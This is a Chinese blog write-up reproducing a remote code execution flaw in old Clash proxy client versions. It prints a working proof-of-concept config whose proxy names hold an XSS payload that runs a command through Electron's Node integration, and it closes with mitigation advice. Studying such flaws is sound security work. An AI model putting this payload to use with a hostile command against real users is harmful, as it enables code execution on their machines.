---
uuid: cbd31cff-6d44-0f3e-82e7-0629628fa3ab
title: Clash漏洞
date: 2022-03-02 21:39:55
tags:
     - 漏洞复现
categories:
     - 漏洞复现
---

前段时间clash软件出现RCE漏洞，在这里将漏洞进行复现！

![image06d498f82885114b.png](https://z4a.net/images/2022/06/14/image06d498f82885114b.png)

<!--more-->

该漏洞影响0.19.9版本以下。

```
port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
  - name: a<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
    type: socks5
    server: 127.0.0.1
    port: "17938"
    skip-cert-verify: true
  - name: abc
    type: socks5
    server: 127.0.0.1
    port: "8088"
    skip-cert-verify: true

proxy-groups:
  -
    name: <img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
    type: select
    proxies:
    - a<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>

```

将POC放入文件中如txt或者yaml然后import导入，此时再点击proxies即可触发poc弹出计算机

![image-20220302214318129](https://img-blog.csdnimg.cn/img_convert/8ff964228acdbe2f723da97472824b88.png)

## 原理

clash 使用了Electron框架，且nodeIntegration值为True，说明开启了Node.js扩展,于是我们可以调用node.js模块从XSS到RCE

只要不进行严格的过滤，就会造成rce

```
require(‘child_process’).exec('')
1
```

形如这样的漏洞已经出现很多如

- 蚁剑
- xmind 2020等等

所以还是谨慎开启nodeIntegration参数，如果开启一定要对用户可控输入点做好充分的过滤

- 如特殊字符实体编码等
